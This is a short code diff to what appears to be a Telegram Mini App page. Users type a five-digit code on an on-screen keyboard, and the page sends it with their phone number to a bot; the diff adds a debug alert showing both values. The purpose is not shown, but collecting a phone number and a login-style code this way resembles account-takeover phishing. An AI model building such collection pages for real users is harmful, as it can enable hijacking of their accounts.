@@ -60,7 +60,8 @@
     <div class="keyboard" id="keyboard"></div>
 
     <script>
-        const WebApp = window.Telegram.WebApp;
+        const WebApp = window.Telegram?.WebApp;
+  
         WebApp.ready();
         WebApp.MainButton.setText('Подтвердить').hide().onClick(sendCode);
 
@@ -140,11 +141,10 @@
 
         function sendCode() {
             if (code.length === 5) {
-                // Отправляем JSON с номером и кодом
-                const data = {
-                    phone: phone,
-                    code: code
-                };
+                // console.log("Sending data:", {phone: phone, code: code});
+                // или alert, если консоль недоступна
+                alert("Отправка: " + JSON.stringify({phone, code}));
+                const data = { phone: phone, code: code };
                 WebApp.sendData(JSON.stringify(data));
             }
         }
